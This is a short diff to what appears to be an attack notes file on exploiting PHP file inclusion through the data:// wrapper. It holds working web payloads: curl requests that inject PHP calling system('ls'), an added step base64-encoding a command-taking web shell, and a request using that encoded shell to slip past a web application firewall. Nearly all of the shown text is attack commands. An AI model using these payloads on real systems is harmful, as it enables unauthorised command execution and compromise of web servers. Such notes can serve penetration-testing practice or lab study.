@@ -29,6 +29,11 @@ using the data filter to run 'ls'
 curl "http://example.local/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
 ```
 
+encoding payload
+```bash
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+```
+
 dodging a WAF (includes base64 payload with webshell)
 ```bash
 curl "http://example.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
